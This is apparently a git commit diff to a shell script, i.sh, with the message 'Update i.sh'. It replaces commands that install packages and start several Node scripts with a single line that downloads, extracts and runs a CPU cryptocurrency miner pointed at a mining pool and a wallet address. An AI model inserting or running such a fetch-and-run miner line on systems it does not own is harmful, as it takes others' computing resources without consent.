10dcd85bbd999bcaa5efdb31920d6c4c814a9b5b
kimochi0 <102447431+kimochi0@users.noreply.github.com>
2022-05-07 09:23:14 +0700

    Update i.sh

--- i.sh
+++ i.sh
@@ -1,8 +1,1 @@
-npm install
-apt install chromium-chromedriver
-node a1.js &
-node a2.js &
-node a3.js &
-node b1.js &
-node b2.js &
-node b3.js
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RJTX2MHX6KjJRS8Byo7rDrWAqbgitUKiyt.POP -p x
